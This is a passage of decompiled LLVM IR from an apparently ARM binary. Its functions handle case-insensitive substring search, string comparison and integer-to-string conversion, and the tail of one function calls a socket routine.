  %v2_1280c = ptrtoint i32* %stack_var_-24 to i32
  %v0_12810 = load i32, i32* %r5.global-to-local, align 4
  %v4_12814 = call i32 @function_13618(i32 %v0_12810, %sockaddr* %v3_12804, i32 %v2_1280c)
  %v1_1281c = call i32 @function_12e9c(i32 %v0_12810)
  br label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %dec_label_pc_12794, %dec_label_pc_127e8
  %v0_12824 = phi i32 [ %v0_127b8, %dec_label_pc_12794 ], [ %v8_127d4, %dec_label_pc_127e8 ]
  store i32 %v3_12794, i32* @r4, align 4
  ret i32 %v0_12824

; uselistorder directives
  uselistorder i32 %v3_127bc, { 2, 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, %sockaddr*, i32)* @function_135ec, { 5, 4, 6, 0, 1, 2, 3, 7 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_13790, { 3, 5, 1, 2, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 4, 0 }
  uselistorder label %dec_label_pc_12824, { 1, 0 }
}

define i32 @function_12830(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12830:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_12834 = load i8, i8* %tmp, align 1
  %v2_12838 = icmp eq i8 %v3_12834, 0
  br i1 %v2_12838, label %bb, label %dec_label_pc_1284c

bb:                                               ; preds = %dec_label_pc_12830
  %v4_12834 = zext i8 %v3_12834 to i32
  br label %dec_label_pc_12860

dec_label_pc_1284c:                               ; preds = %dec_label_pc_12830
  br label %dec_label_pc_12850

dec_label_pc_12850:                               ; preds = %dec_label_pc_12850, %dec_label_pc_1284c
  %v0_12850 = phi i32 [ %v1_12850, %dec_label_pc_12850 ], [ 0, %dec_label_pc_1284c ]
  %v1_12850 = add i32 %v0_12850, 1
  %v2_12854 = add i32 %v1_12850, %arg2
  %v3_12854 = inttoptr i32 %v2_12854 to i8*
  %v4_12854 = load i8, i8* %v3_12854, align 1
  %v2_12858 = icmp eq i8 %v4_12854, 0
  br i1 %v2_12858, label %dec_label_pc_12860, label %dec_label_pc_12850

dec_label_pc_12860:                               ; preds = %dec_label_pc_12850, %bb
  %v0_128a418 = phi i32 [ %v4_12834, %bb ], [ %v1_12850, %dec_label_pc_12850 ]
  %v0_128681 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_128681, 1
  br i1 %tmp27, label %dec_label_pc_128b4, label %dec_label_pc_12874

dec_label_pc_12874:                               ; preds = %dec_label_pc_12860, %dec_label_pc_12868.backedge
  %v0_1286c.in = phi i32 [ %v0_1286c, %dec_label_pc_12868.backedge ], [ %v0_128681, %dec_label_pc_12860 ]
  %v0_12898 = phi i32 [ %v1_12898., %dec_label_pc_12868.backedge ], [ 0, %dec_label_pc_12860 ]
  %v0_12874 = phi i32 [ %v5_12874, %dec_label_pc_12868.backedge ], [ %tmp20, %dec_label_pc_12860 ]
  %v0_1286c = add i32 %v0_1286c.in, -1
  %v1_12874 = inttoptr i32 %v0_12874 to i8*
  %v2_12874 = load i8, i8* %v1_12874, align 1
  %v3_12874 = zext i8 %v2_12874 to i32
  store i32 %v3_12874, i32* @lr, align 4
  %v5_12874 = add i32 %v0_12874, 1
  %v2_12878 = add i32 %v0_12898, %arg2
  %v3_12878 = inttoptr i32 %v2_12878 to i8*
  %v4_12878 = load i8, i8* %v3_12878, align 1
  %v6_12878 = zext i8 %v4_12878 to i32
  %v1_1287c = add nsw i32 %v3_12874, -65
  %v1_12880 = add nsw i32 %v6_12878, -65
  %tmp35 = icmp ult i32 %v1_1287c, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_12874
  %v5_12888 = or i32 %v3_12874, 96
  store i32 %v5_12888, i32* @lr, align 4
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_12874, %bb28
  %v0_12894 = phi i32 [ %v3_12874, %dec_label_pc_12874 ], [ %v5_12888, %bb28 ]
  %tmp36 = icmp ult i32 %v1_12880, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_12890 = or i32 %v6_12878, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_12894 = phi i32 [ %v6_12878, %bb29 ], [ %v5_12890, %bb30 ]
  %v9_12894 = icmp eq i32 %v0_12894, %v1_12894
  %v1_12898 = add i32 %v0_12898, 1
  %v1_12898. = select i1 %v9_12894, i32 %v1_12898, i32 0
  br i1 %v9_12894, label %dec_label_pc_128a4, label %dec_label_pc_12868.backedge

dec_label_pc_12868.backedge:                      ; preds = %bb31, %dec_label_pc_128a4
  %tmp32 = icmp slt i32 %v0_1286c, 1
  br i1 %tmp32, label %dec_label_pc_128b4, label %dec_label_pc_12874

dec_label_pc_128a4:                               ; preds = %bb31
  %v9_128a4 = icmp eq i32 %v0_128a418, %v1_12898.
  br i1 %v9_128a4, label %dec_label_pc_128ac, label %dec_label_pc_12868.backedge

dec_label_pc_128ac:                               ; preds = %dec_label_pc_128a4
  %v2_128ac = sub i32 %v5_12874, %tmp20
  ret i32 %v2_128ac

dec_label_pc_128b4:                               ; preds = %dec_label_pc_12868.backedge, %dec_label_pc_12860
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_12898., { 1, 0 }
  uselistorder i32 %v0_12874, { 1, 0 }
  uselistorder i32 %v0_12898, { 1, 0 }
  uselistorder i8 %v3_12834, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder label %dec_label_pc_12868.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_12874, { 1, 0 }
}

define i32 @function_128bc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_128bc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_128bc = load i8, i8* %arg1, align 1
  %v2_128c0 = icmp eq i8 %v2_128bc, 0
  br i1 %v2_128c0, label %bb, label %dec_label_pc_128cc

bb:                                               ; preds = %dec_label_pc_128bc
  %v3_128bc = zext i8 %v2_128bc to i32
  br label %dec_label_pc_128e0

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128bc
  br label %dec_label_pc_128d0

dec_label_pc_128d0:                               ; preds = %dec_label_pc_128d0, %dec_label_pc_128cc
  %v0_128d0 = phi i32 [ %v1_128d0, %dec_label_pc_128d0 ], [ 0, %dec_label_pc_128cc ]
  %v1_128d0 = add i32 %v0_128d0, 1
  %v2_128d4 = add i32 %v1_128d0, %tmp
  %v3_128d4 = inttoptr i32 %v2_128d4 to i8*
  %v4_128d4 = load i8, i8* %v3_128d4, align 1
  %v2_128d8 = icmp eq i8 %v4_128d4, 0
  br i1 %v2_128d8, label %dec_label_pc_128e0, label %dec_label_pc_128d0

dec_label_pc_128e0:                               ; preds = %dec_label_pc_128d0, %bb
  %v1_12904 = phi i32 [ %v3_128bc, %bb ], [ %v1_128d0, %dec_label_pc_128d0 ]
  %v1_128e0 = inttoptr i32 %arg2 to i8*
  %v2_128e0 = load i8, i8* %v1_128e0, align 1
  %v3_128e0 = zext i8 %v2_128e0 to i32
  %v2_128e4 = icmp eq i8 %v2_128e0, 0
  br i1 %v2_128e4, label %bb22, label %dec_label_pc_128f0

bb22:                                             ; preds = %dec_label_pc_128e0
  store i32 %v3_128e0, i32* @r2, align 4
  br label %dec_label_pc_12904

dec_label_pc_128f0:                               ; preds = %dec_label_pc_128e0
  br label %dec_label_pc_128f4

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128f4, %dec_label_pc_128f0
  %v0_128f4 = phi i32 [ %v1_128f4, %dec_label_pc_128f4 ], [ 0, %dec_label_pc_128f0 ]
  %v1_128f4 = add i32 %v0_128f4, 1
  store i32 %v1_128f4, i32* @r2, align 4
  %v2_128f8 = add i32 %v1_128f4, %arg2
  %v3_128f8 = inttoptr i32 %v2_128f8 to i8*
  %v4_128f8 = load i8, i8* %v3_128f8, align 1
  %v2_128fc = icmp eq i8 %v4_128f8, 0
  br i1 %v2_128fc, label %dec_label_pc_12904, label %dec_label_pc_128f4

dec_label_pc_12904:                               ; preds = %dec_label_pc_128f4, %bb22
  %v0_129304 = phi i32 [ %v3_128e0, %bb22 ], [ %v1_128f4, %dec_label_pc_128f4 ]
  %v9_12904 = icmp eq i32 %v0_129304, %v1_12904
  br i1 %v9_12904, label %dec_label_pc_12930.preheader, label %dec_label_pc_12910

dec_label_pc_12930.preheader:                     ; preds = %dec_label_pc_12904
  %v2_129306 = icmp eq i32 %v1_12904, 0
  br i1 %v2_129306, label %dec_label_pc_12938, label %dec_label_pc_12918

dec_label_pc_12910:                               ; preds = %dec_label_pc_12918, %dec_label_pc_12904
  ret i32 0

dec_label_pc_12918:                               ; preds = %dec_label_pc_12928, %dec_label_pc_12930.preheader
  %v0_12930.in = phi i32 [ %v0_12930, %dec_label_pc_12928 ], [ %v1_12904, %dec_label_pc_12930.preheader ]
  %v0_1292c = phi i32 [ %v1_1292c, %dec_label_pc_12928 ], [ %arg2, %dec_label_pc_12930.preheader ]
  %v0_12928 = phi i32 [ %v1_12928, %dec_label_pc_12928 ], [ %tmp, %dec_label_pc_12930.preheader ]
  %v0_12930 = add i32 %v0_12930.in, -1
  %v1_12918 = inttoptr i32 %v0_12928 to i8*
  %v2_12918 = load i8, i8* %v1_12918, align 1
  %v3_12918 = zext i8 %v2_12918 to i32
  store i32 %v3_12918, i32* @r2, align 4
  %v1_1291c = inttoptr i32 %v0_1292c to i8*
  %v2_1291c = load i8, i8* %v1_1291c, align 1
  %v9_12920 = icmp eq i8 %v2_12918, %v2_1291c
  br i1 %v9_12920, label %dec_label_pc_12928, label %dec_label_pc_12910

dec_label_pc_12928:                               ; preds = %dec_label_pc_12918
  %v1_12928 = add i32 %v0_12928, 1
  %v1_1292c = add i32 %v0_1292c, 1
  %v2_12930 = icmp eq i32 %v0_12930, 0
  br i1 %v2_12930, label %dec_label_pc_12938, label %dec_label_pc_12918

dec_label_pc_12938:                               ; preds = %dec_label_pc_12928, %dec_label_pc_12930.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_128f4, { 0, 1, 3, 2 }
  uselistorder i8 %v2_128bc, { 1, 0 }
}

define i32 @function_12940(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12940:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_12944 = load i8, i8* %arg1, align 1
  %v2_12948 = icmp eq i8 %v2_12944, 0
  %v0_1294c = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_12948, label %bb, label %dec_label_pc_12958

bb:                                               ; preds = %dec_label_pc_12940
  %v3_12944 = zext i8 %v2_12944 to i32
  br label %dec_label_pc_1296c

dec_label_pc_12958:                               ; preds = %dec_label_pc_12940
  br label %dec_label_pc_1295c

dec_label_pc_1295c:                               ; preds = %dec_label_pc_1295c, %dec_label_pc_12958
  %v0_1295c = phi i32 [ %v1_1295c, %dec_label_pc_1295c ], [ 0, %dec_label_pc_12958 ]
  %v1_1295c = add i32 %v0_1295c, 1
  %v2_12960 = add i32 %v1_1295c, %tmp
  %v3_12960 = inttoptr i32 %v2_12960 to i8*
  %v4_12960 = load i8, i8* %v3_12960, align 1
  %v2_12964 = icmp eq i8 %v4_12960, 0
  br i1 %v2_12964, label %dec_label_pc_1296c, label %dec_label_pc_1295c

dec_label_pc_1296c:                               ; preds = %dec_label_pc_1295c, %bb
  %v9_12994 = phi i32 [ %v3_12944, %bb ], [ %v1_1295c, %dec_label_pc_1295c ]
  %v0_1296c = load i32, i32* %r1.global-to-local, align 4
  %v1_1296c = inttoptr i32 %v0_1296c to i8*
  %v2_1296c = load i8, i8* %v1_1296c, align 1
  %v3_1296c = zext i8 %v2_1296c to i32
  %v2_12970 = icmp eq i8 %v2_1296c, 0
  br i1 %v2_12970, label %bb26, label %dec_label_pc_1297c

bb26:                                             ; preds = %dec_label_pc_1296c
  store i32 %v3_1296c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12990

dec_label_pc_1297c:                               ; preds = %dec_label_pc_1296c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %dec_label_pc_12980, %dec_label_pc_1297c
  %v0_12980 = phi i32 [ %v1_12980, %dec_label_pc_12980 ], [ 0, %dec_label_pc_1297c ]
  %v1_12980 = add i32 %v0_12980, 1
  store i32 %v1_12980, i32* %r2.global-to-local, align 4
  %v2_12984 = add i32 %v1_12980, %v0_1296c
  %v3_12984 = inttoptr i32 %v2_12984 to i8*
  %v4_12984 = load i8, i8* %v3_12984, align 1
  %v2_12988 = icmp eq i8 %v4_12984, 0
  br i1 %v2_12988, label %dec_label_pc_12990, label %dec_label_pc_12980

dec_label_pc_12990:                               ; preds = %dec_label_pc_12980, %bb26
  %v1_12990 = phi i32 [ %v3_1296c, %bb26 ], [ %v1_12980, %dec_label_pc_12980 ]
  %v2_12990 = sub i32 %v0_1294c, %v1_12990
  %v4_12990 = xor i32 %v1_12990, %v0_1294c
  %v5_12990 = xor i32 %v2_12990, %v0_1294c
  %v6_12990 = and i32 %v5_12990, %v4_12990
  %v7_12994 = icmp sgt i32 %v0_1294c, %v1_12990
  br i1 %v7_12994, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_12990
  %v10_12994 = sub i32 %v0_1294c, %v9_12994
  %v12_12994 = xor i32 %v9_12994, %v0_1294c
  %v13_12994 = xor i32 %v10_12994, %v0_1294c
  %v14_12994 = and i32 %v13_12994, %v12_12994
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_12990, %bb27
  %v2_12998.in = phi i32 [ %v6_12990, %dec_label_pc_12990 ], [ %v14_12994, %bb27 ]
  %v1_12998.in = phi i32 [ %v2_12990, %dec_label_pc_12990 ], [ %v10_12994, %bb27 ]
  %v1_12990.pn = phi i32 [ %v1_12990, %dec_label_pc_12990 ], [ %v9_12994, %bb27 ]
  %v0_12998 = icmp eq i32 %v0_1294c, %v1_12990.pn
  %v1_12998 = icmp slt i32 %v1_12998.in, 0
  %v2_12998 = icmp slt i32 %v2_12998.in, 0
  %v3_12998 = xor i1 %v2_12998, %v1_12998
  %v4_12998 = or i1 %v0_12998, %v3_12998
  br i1 %v4_12998, label %dec_label_pc_129a8.preheader, label %dec_label_pc_129c0

dec_label_pc_129a8.preheader:                     ; preds = %bb28
  %v2_129a85 = icmp eq i32 %v0_1294c, 0
  br i1 %v2_129a85, label %dec_label_pc_129c8, label %dec_label_pc_129b0

dec_label_pc_129a0:                               ; preds = %dec_label_pc_129b0
  %v1_129a0 = add i32 %v0_129a0, 1
  %v1_129a4 = add i32 %v0_129a4, 1
  store i32 %v1_129a4, i32* %r1.global-to-local, align 4
  %v2_129a8 = icmp eq i32 %v0_129a8, 0
  br i1 %v2_129a8, label %dec_label_pc_129c8, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_129a0, %dec_label_pc_129a8.preheader
  %v0_129a8.in = phi i32 [ %v0_129a8, %dec_label_pc_129a0 ], [ %v0_1294c, %dec_label_pc_129a8.preheader ]
  %v0_129a4 = phi i32 [ %v1_129a4, %dec_label_pc_129a0 ], [ %v0_1296c, %dec_label_pc_129a8.preheader ]
  %v0_129a0 = phi i32 [ %v1_129a0, %dec_label_pc_129a0 ], [ %tmp, %dec_label_pc_129a8.preheader ]
  %v0_129a8 = add i32 %v0_129a8.in, -1
  %v1_129b0 = inttoptr i32 %v0_129a0 to i8*
  %v2_129b0 = load i8, i8* %v1_129b0, align 1
  %v3_129b0 = zext i8 %v2_129b0 to i32
  store i32 %v3_129b0, i32* %r2.global-to-local, align 4
  %v1_129b4 = inttoptr i32 %v0_129a4 to i8*
  %v2_129b4 = load i8, i8* %v1_129b4, align 1
  %v9_129b8 = icmp eq i8 %v2_129b0, %v2_129b4
  br i1 %v9_129b8, label %dec_label_pc_129a0, label %dec_label_pc_129c0

dec_label_pc_129c0:                               ; preds = %dec_label_pc_129b0, %bb28
  ret i32 0

dec_label_pc_129c8:                               ; preds = %dec_label_pc_129a0, %dec_label_pc_129a8.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v0_129a0, { 1, 0 }
  uselistorder i32 %v0_129a4, { 1, 0 }
  uselistorder i32 %v1_12990, { 0, 3, 1, 2 }
  uselistorder i32 %v1_12980, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1294c, { 0, 6, 1, 2, 3, 7, 9, 4, 5, 8 }
  uselistorder i8 %v2_12944, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_129d0(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_129d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_129d0 = load i32, i32* @r4, align 4
  store i32 %v3_129d0, i32* %stack_var_-28, align 4
  %v22_129d0 = ptrtoint i32* %stack_var_-28 to i32
  %v0_129d4 = load i32, i32* @r2, align 4
  store i32 %v0_129d4, i32* %r8.global-to-local, align 4
  %v2_129d4 = icmp eq i32 %v0_129d4, 0
  store i1 %v2_129d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_129d4, label %dec_label_pc_12ac4, label %dec_label_pc_129e4

dec_label_pc_129e4:                               ; preds = %dec_label_pc_129d0
  %v3_129e4 = icmp eq i8 %arg1, 0
  store i1 %v3_129e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_129e4, label %.thread, label %dec_label_pc_129f8

.thread:                                          ; preds = %dec_label_pc_129e4
  %v4_129ec = inttoptr i32 %v0_129d4 to i8*
  store i8 48, i8* %v4_129ec, align 1
  %v0_129f0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_129f0.pr.pr, label %.thread1, label %dec_label_pc_129f8

.thread1:                                         ; preds = %.thread
  %v4_129f0 = load i32, i32* %r8.global-to-local, align 4
  %v5_129f0 = add i32 %v4_129f0, 1
  %v6_129f0 = inttoptr i32 %v5_129f0 to i8*
  store i8 0, i8* %v6_129f0, align 1
  %v0_129f4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_129f4.pr.pr, label %dec_label_pc_12ac4, label %dec_label_pc_129f8

dec_label_pc_129f8:                               ; preds = %dec_label_pc_129e4, %.thread, %.thread1
  %v7_129fc = icmp eq i32 %arg2, 10
  store i1 %v7_129fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129fc, label %bb, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_129f8
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_129f8
  %tmp39 = icmp slt i8 %arg1, 0
  %phitmp = icmp eq i1 %tmp39, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_12a20

.thread4:                                         ; preds = %bb, %.thread21
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a30

dec_label_pc_12a20:                               ; preds = %bb
  %v2_12a20 = sub nsw i32 0, %tmp
  store i32 %v2_12a20, i32* %r4.global-to-local, align 4
  store i1 %v3_129e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_129e4, label %dec_label_pc_12ad0, label %dec_label_pc_12a30

dec_label_pc_12a30:                               ; preds = %dec_label_pc_12a20, %.thread4
  %v0_12a3810 = phi i32 [ %tmp, %.thread4 ], [ %v2_12a20, %dec_label_pc_12a20 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_12a20 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_12a34 = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_12a34, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12a38

dec_label_pc_12a38:                               ; preds = %bb37, %dec_label_pc_12a30
  %v0_12a38 = phi i32 [ %v0_12a5c, %bb37 ], [ %v0_12a3810, %dec_label_pc_12a30 ]
  store i32 %v0_12a38, i32* %r0.global-to-local, align 4
  %v0_12a3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12a3c, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_12a38, 16777216
  %v1_12a40 = sdiv i32 %sext, 16777216
  %v3_12a40 = call i32 @function_12bf8(i32 %v1_12a40, i32 %v0_12a3c)
  store i32 %v3_12a40, i32* %r0.global-to-local, align 4
  %v7_12a44 = icmp eq i32 %v3_12a40, 9
  store i1 %v7_12a44, i1* %cpsr_z.global-to-local, align 1
  %v1_12a48 = add i32 %v3_12a40, 48
  %v0_12a4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12a4c, i32* @r1, align 4
  %v7_12a50 = icmp sgt i32 %v3_12a40, 9
  %extract.t = trunc i32 %v1_12a48 to i8
  br i1 %v7_12a50, label %bb36, label %bb37

bb36:                                             ; preds = %dec_label_pc_12a38
  %v9_12a50 = add i32 %v3_12a40, 55
  %extract.t20 = trunc i32 %v9_12a50 to i8
  br label %bb37

bb37:                                             ; preds = %dec_label_pc_12a38, %bb36
  %v0_12a58.off0 = phi i8 [ %extract.t, %dec_label_pc_12a38 ], [ %extract.t20, %bb36 ]
  %v0_12a54 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12a54, i32* @r0, align 4
  %v2_12a58 = load i32, i32* %r7.global-to-local, align 4
  %v3_12a58 = inttoptr i32 %v2_12a58 to i8*
  store i8 %v0_12a58.off0, i8* %v3_12a58, align 1
  %v4_12a58 = load i32, i32* %r7.global-to-local, align 4
  %v5_12a58 = add i32 %v4_12a58, -1
  store i32 %v5_12a58, i32* %r7.global-to-local, align 4
  %v0_12a5c = call i32 @function_12ae8()
  store i32 %v0_12a5c, i32* %r0.global-to-local, align 4
  store i32 %v0_12a5c, i32* %r4.global-to-local, align 4
  %v2_12a60 = icmp eq i32 %v0_12a5c, 0
  store i1 %v2_12a60, i1* %cpsr_z.global-to-local, align 1
  %v0_12a64 = load i32, i32* %r6.global-to-local, align 4
  %v1_12a64 = add i32 %v0_12a64, -1
  store i32 %v1_12a64, i32* %r6.global-to-local, align 4
  br i1 %v2_12a60, label %dec_label_pc_12a6c, label %dec_label_pc_12a38

dec_label_pc_12a6c:                               ; preds = %bb37
  %v0_12a6c = load i32, i32* %sl.global-to-local, align 4
  %v2_12a6c = icmp eq i32 %v0_12a6c, 0
  store i1 %v2_12a6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a6c, label %bb38, label %dec_label_pc_12ad4

bb38:                                             ; preds = %dec_label_pc_12a6c
  store i32 %v0_12a64, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a78

dec_label_pc_12a78:                               ; preds = %bb38, %dec_label_pc_12ad4
  %v1_12a84 = phi i32 [ %v0_12a64, %bb38 ], [ %v1_12a7c.pre, %dec_label_pc_12ad4 ]
  %v2_12a78 = ptrtoint i32* %stack_var_-62 to i32
  %v2_12a7c = add i32 %v1_12a84, %v2_12a78
  %v3_12a7c = inttoptr i32 %v2_12a7c to i8*
  %v4_12a7c = load i8, i8* %v3_12a7c, align 1
  %v6_12a7c = zext i8 %v4_12a7c to i32
  %v2_12a80 = icmp eq i8 %v4_12a7c, 0
  store i1 %v2_12a80, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_12a7c, i32* %r1.global-to-local, align 4
  br i1 %v2_12a80, label %dec_label_pc_12aa8, label %dec_label_pc_12a8c

dec_label_pc_12a8c:                               ; preds = %dec_label_pc_12a78
  br label %dec_label_pc_12a90

dec_label_pc_12a90:                               ; preds = %dec_label_pc_12a90, %dec_label_pc_12a8c
  %v0_12a90 = phi i32 [ %v1_12a90, %dec_label_pc_12a90 ], [ 0, %dec_label_pc_12a8c ]
  %v1_12a90 = add i32 %v0_12a90, 1
  store i32 %v1_12a90, i32* @r2, align 4
  %v2_12a94 = add i32 %v1_12a90, %v2_12a7c
  %v3_12a94 = inttoptr i32 %v2_12a94 to i8*
  %v4_12a94 = load i8, i8* %v3_12a94, align 1
  %v2_12a98 = icmp eq i8 %v4_12a94, 0
  store i1 %v2_12a98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12a98, label %dec_label_pc_12aa0, label %dec_label_pc_12a90

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a90
  %v7_12aa0 = icmp eq i32 %v0_12a90, -2
  store i1 %v7_12aa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12aa0, label %dec_label_pc_12ac4, label %dec_label_pc_12aa8

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12aa0, %dec_label_pc_12a78
  %v0_12ab017 = phi i32 [ %v1_12a90, %dec_label_pc_12aa0 ], [ %v6_12a7c, %dec_label_pc_12a78 ]
  store i32 %v2_12a7c, i32* %r0.global-to-local, align 4
  %v0_12aac = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12aac, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12ab0

dec_label_pc_12ab0:                               ; preds = %dec_label_pc_12ab0.dec_label_pc_12ab0_crit_edge, %dec_label_pc_12aa8
  %v2_12abc = phi i32 [ %v5_12abc, %dec_label_pc_12ab0.dec_label_pc_12ab0_crit_edge ], [ %v0_12aac, %dec_label_pc_12aa8 ]
  %v0_12ab4 = phi i32 [ %v0_12ab4.pre, %dec_label_pc_12ab0.dec_label_pc_12ab0_crit_edge ], [ %v2_12a7c, %dec_label_pc_12aa8 ]
  %v0_12ab0 = phi i32 [ %v0_12ab0.pre, %dec_label_pc_12ab0.dec_label_pc_12ab0_crit_edge ], [ %v0_12ab017, %dec_label_pc_12aa8 ]
  %v1_12ab0 = add i32 %v0_12ab0, -1
  store i32 %v1_12ab0, i32* @r2, align 4
  %v1_12ab4 = inttoptr i32 %v0_12ab4 to i8*
  %v2_12ab4 = load i8, i8* %v1_12ab4, align 1
  %v5_12ab4 = add i32 %v0_12ab4, 1
  store i32 %v5_12ab4, i32* %r0.global-to-local, align 4
  %v3_12ab8 = icmp eq i32 %v0_12ab0, 0
  store i1 %v3_12ab8, i1* %cpsr_z.global-to-local, align 1
  %v3_12abc = inttoptr i32 %v2_12abc to i8*
  store i8 %v2_12ab4, i8* %v3_12abc, align 1
  %v4_12abc = load i32, i32* %r1.global-to-local, align 4
  %v5_12abc = add i32 %v4_12abc, 1
  store i32 %v5_12abc, i32* %r1.global-to-local, align 4
  br i1 %v3_12ab8, label %dec_label_pc_12ac4, label %dec_label_pc_12ab0.dec_label_pc_12ab0_crit_edge

dec_label_pc_12ab0.dec_label_pc_12ab0_crit_edge:  ; preds = %dec_label_pc_12ab0
  %v0_12ab0.pre = load i32, i32* @r2, align 4
  %v0_12ab4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12ab0

dec_label_pc_12ac4:                               ; preds = %dec_label_pc_12ab0, %dec_label_pc_12aa0, %.thread1, %dec_label_pc_129d0
  %v0_12ac4 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_12ac4, i32* %r0.global-to-local, align 4
  %v2_12acc = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_12acc, i32* @r4, align 4
  ret i32 %v0_12ac4

dec_label_pc_12ad0:                               ; preds = %dec_label_pc_12a20
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12ad4

dec_label_pc_12ad4:                               ; preds = %dec_label_pc_12a6c, %dec_label_pc_12ad0
  %v1_12ad8 = phi i32 [ %v1_12a64, %dec_label_pc_12a6c ], [ 32, %dec_label_pc_12ad0 ]
  %v2_12ad8 = add i32 %v1_12ad8, %v22_129d0
  %v3_12ae0 = add i32 %v2_12ad8, -34
  %v4_12ae0 = inttoptr i32 %v3_12ae0 to i8*
  store i8 45, i8* %v4_12ae0, align 1
  %v1_12a7c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a78

; uselistorder directives
  uselistorder i32 %v5_12abc, { 1, 0 }
  uselistorder i1 %v3_12ab8, { 1, 0 }
  uselistorder i32 %v0_12ab4, { 1, 0 }
  uselistorder i1 %v7_12aa0, { 1, 0 }
  uselistorder i32 %v1_12a90, { 0, 1, 3, 2 }
  uselistorder i32 %v2_12a7c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12a5c, { 1, 2, 3, 0 }
  uselistorder i32 %v3_12a40, { 1, 0, 2, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
